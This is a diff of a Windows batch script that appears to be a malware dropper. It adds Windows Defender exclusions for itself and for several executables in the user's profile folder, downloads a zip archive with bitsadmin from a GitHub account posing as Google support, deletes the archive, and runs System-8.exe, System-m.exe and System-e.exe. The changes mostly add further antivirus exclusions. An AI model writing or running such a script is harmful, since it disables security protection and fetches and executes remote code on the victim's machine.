@@ -1,8 +1,9 @@
-cd "%USERPROFILE%\
+
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\2.bat"
 powershell Add-MpPreference -ExclusionProcess "C:\Windows\2.bat"
 
 
+cd "%USERPROFILE%\
 
 bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip
 
@@ -16,15 +17,18 @@ bitsadmin /transfer Packages /download /priority foreground https://github.com/s
 
 del winfiles.zip
 
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "System-8.exe"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-8.exe"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " C:\%USERPROFILE%\System-8.exe"
+powershell Add-MpPreference -ExclusionProcess "C:\%USERPROFILE%\System-e.exe"
+
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-m.exe"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-e.exe"
 
 System-8.exe
 System-m.exe
 System-e.exe
 
 
-powershell Add-MpPreference -ExclusionProcess "System-8.exe"
-powershell -command " System-8.exe"
 
 System-8.exe
 System-m.exe
@@ -33,6 +37,5 @@ System-e.exe
 
 
 exit
-
 
 
